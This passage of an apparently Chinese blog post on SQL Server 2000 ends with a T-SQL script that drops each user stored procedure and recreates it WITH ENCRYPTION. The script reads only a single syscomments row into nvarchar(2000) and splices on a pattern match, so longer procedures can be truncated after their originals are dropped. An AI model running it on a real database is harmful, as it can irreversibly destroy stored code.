style="font-family:’Times New Roman’;">&nbsp;&nbsp;&nbsp; print&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">存在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">else</span></span><br><br><span style="font-size:small;"><span lang="EN-US"><span style="font-family:’Times New Roman’;">&nbsp;&nbsp;&nbsp; print&nbsp; N’</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">不存在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;">’</span></span></span><br><br>&nbsp;<br><br><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;"><span style="font-size:small;">下面给出了一个存储过程，它的作用是自动将当前数据库的用户存储过程加密。</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @sp_name nvarchar(400)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @sp_content nvarchar(2000)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE @asbegin int</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">declare @now datetime</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">select @now = getdate()</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DECLARE sp_cursor CURSOR FOR </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT object_name(id)</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FROM sysobjects</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHERE xtype = ’P’ </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND type = ’P’ </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND crdate &lt; @now</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">AND OBJECTPROPERTY(id, ’IsMSShipped’)=0</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">OPEN sp_cursor</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FETCH NEXT FROM sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INTO @sp_name</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">WHILE @@FETCH_STATUS = 0</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">BEGIN</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_content = text FROM syscomments WHERE id = OBJECT_ID(@sp_name) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @asbegin = PATINDEX ( ’%AS’ + char(13) + ’%’, @sp_content) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_content = SUBSTRING(@sp_content, 1, @asbegin - 1) </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">+ ’ WITH ENCRYPTION AS’</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">+ SUBSTRING (@sp_content, @asbegin+2, LEN(@sp_content))</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">SELECT @sp_name = ’DROP PROCEDURE [’ + @sp_name + ’]’</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">EXEC sp_executesql @sp_name </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">EXEC sp_executesql @sp_content</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">FETCH NEXT FROM sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">INTO @sp_name</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">END</span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">CLOSE sp_cursor </span></span><br><br><span lang="EN-US"><span style="font-family:’Times New Roman’;font-size:small;">DEALLOCATE sp_cursor</span></span><br><br><span style="font-size:small;"><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">该存储过程利用了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> sysobjects </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">和</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> syscomments </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">表，并巧妙地修改了原存储过程的</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">定义语句，将</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> AS </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">修改为了</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> WITH ENCRYPTION AS</span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">，从而达到了加密存储过程的目的。本存储过程在</span><span lang="EN-US"><span style="font-family:’Times New Roman’;"> SQL Server 2000 </span></span><span style="font-family:宋体;mso-ascii-font-family:’Times New Roman’;mso-hansi-font-family:’Times New Roman’;">上通过。</span></span><br><br></div><br></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mssql/" rel="tag"># mssql</a>
+          
+            <a href="/tags/sqlserver2000/" rel="tag"># sqlserver2000</a>
+          
+            <a href="/tags/注入/" rel="tag"># 注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2011/10/07/两种php源码加密代码/" rel="next" title="两种php源码加密代码">
+                <i class="fa fa-chevron-left"></i> 两种php源码加密代码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2011/10/19/和linux用户加密有关的破解题/" rel="prev" title="和linux用户加密有关的破解题">
+                和linux用户加密有关的破解题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL2000系统表、存储过程、函数的功能介绍及应用"><span class="nav-number">1.</span> <span class="nav-text">SQL2000系统表、存储过程、函数的功能介绍及应用 </span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
